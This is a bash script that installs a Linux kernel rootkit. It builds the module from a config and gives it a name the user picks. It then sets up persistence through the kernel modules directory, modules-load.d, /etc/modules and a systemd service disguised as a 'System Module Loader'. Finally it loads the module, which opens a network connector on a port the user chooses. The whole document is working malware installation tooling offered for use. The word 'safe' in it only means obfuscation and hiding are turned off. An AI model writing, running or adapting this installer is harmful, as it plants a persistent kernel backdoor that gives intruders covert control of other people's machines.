#!/bin/bash

# Safe Rootkit Installer - Minimal features to avoid crashes

set -e

# Check for root privileges
if [ "$EUID" -ne 0 ]; then
    echo "[-] Please run as root"
    exit 1
fi

# Prompt for port number
read -p "Enter the connector port number: " PORT_NUMBER
if [ -z "$PORT_NUMBER" ]; then
    echo "[-] Port number is required"
    exit 1
fi

# Validate port number
if ! [[ "$PORT_NUMBER" =~ ^[0-9]+$ ]] || [ "$PORT_NUMBER" -lt 1 ] || [ "$PORT_NUMBER" -gt 65535 ]; then
    echo "[-] Invalid port number. Must be between 1 and 65535"
    exit 1
fi

echo "[+] Using port: $PORT_NUMBER"

# Update safe config
sed -i.bak "s/port: \"[0-9]*\"/port: \"$PORT_NUMBER\"/" rootkit_files/config_safe.yml

# Build rootkit WITHOUT obfuscation (safer)
echo "[+] Building rootkit with minimal features (no obfuscation)..."
python3 builder.py -c rootkit_files/config_safe.yml

# Get rootkit name
if [ -z "$1" ]; then
    read -p "Enter rootkit name: " ROOTKIT_NAME
    if [ -z "$ROOTKIT_NAME" ]; then
        echo "[-] Rootkit name is required"
        exit 1
    fi
else
    ROOTKIT_NAME="$1"
fi

KERNEL_VERSION=$(uname -r)
MODULE_PATH="/lib/modules/${KERNEL_VERSION}/kernel/drivers/misc"
MODULE_CONF="/etc/modules-load.d/${ROOTKIT_NAME}.conf"
MODULE_KO="project.ko"  # Default name when not obfuscated

# Verify build output
if [ ! -f "$MODULE_KO" ]; then
    echo "[-] Build failed: ${MODULE_KO} not found"
    exit 1
fi

# Rename to desired name
mv "$MODULE_KO" "${ROOTKIT_NAME}.ko"
MODULE_KO="${ROOTKIT_NAME}.ko"

echo "[+] Installing rootkit with basic persistence (safe mode)..."

# Method 1: Standard module installation
echo "[+] Installing to: $MODULE_PATH"
mkdir -p "$MODULE_PATH"
cp "$MODULE_KO" "$MODULE_PATH/"
chmod 644 "$MODULE_PATH/$MODULE_KO"

# Update module index
echo "[+] Running depmod..."
depmod -a

# Method 2: modules-load.d configuration
echo "[+] Creating auto-load config at $MODULE_CONF"
echo "$ROOTKIT_NAME" > "$MODULE_CONF"

# Method 3: Add to /etc/modules (for older systems)
if [ -f "/etc/modules" ]; then
    if ! grep -q "^$ROOTKIT_NAME$" /etc/modules; then
        echo "[+] Adding to /etc/modules"
        echo "$ROOTKIT_NAME" >> /etc/modules
    fi
fi

# Method 4: Create systemd service for additional persistence
SYSTEMD_SERVICE="/etc/systemd/system/${ROOTKIT_NAME}-loader.service"
echo "[+] Creating systemd service: $SYSTEMD_SERVICE"
cat > "$SYSTEMD_SERVICE" << EOF
[Unit]
Description=System Module Loader for $ROOTKIT_NAME
After=multi-user.target
Wants=multi-user.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe $ROOTKIT_NAME
ExecStop=/sbin/rmmod $ROOTKIT_NAME
RemainAfterExit=yes
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

# Enable the systemd service
echo "[+] Enabling systemd service..."
systemctl daemon-reload
systemctl enable "${ROOTKIT_NAME}-loader.service"

# Load module now with careful error checking
echo "[+] Loading module using modprobe..."
if modprobe "$ROOTKIT_NAME"; then
    echo "[✓] Module loaded successfully"
    
    # Verify it's actually loaded
    if lsmod | grep -q "$ROOTKIT_NAME"; then
        echo "[✓] Module verified in lsmod"
    else
        echo "[!] Module not visible in lsmod (may be working correctly)"
    fi
    
    # Check if it's in /proc/modules as alternative
    if grep -q "$ROOTKIT_NAME" /proc/modules; then
        echo "[✓] Module confirmed in /proc/modules"
    fi
    
else
    echo "[✗] Module failed to load. Checking dmesg..."
    dmesg | tail -10
    exit 1
fi

echo ""
echo "Safe Installation Summary:"
echo "- Installed module: $MODULE_PATH/$MODULE_KO"
echo "- Auto-load config: $MODULE_CONF"
echo "- Systemd service: $SYSTEMD_SERVICE (enabled)"
echo "- Configuration: Minimal features (connector only)"
echo "- Obfuscation: Disabled for stability"
echo "- Status: $(lsmod | grep "$ROOTKIT_NAME" | awk '{print $1 " (loaded)"}' || echo "Loaded but hidden")"
echo ""
echo "[+] Safe installation complete. Features enabled:"
echo "    - Network connector on port $PORT_NUMBER"
echo "    - Basic persistence mechanisms"
echo "    - NO hiding features (for stability)"
echo ""
echo "[!] To test network connectivity:"
echo "    netstat -tlnp | grep $PORT_NUMBER"
echo "    ss -tlnp | grep $PORT_NUMBER"
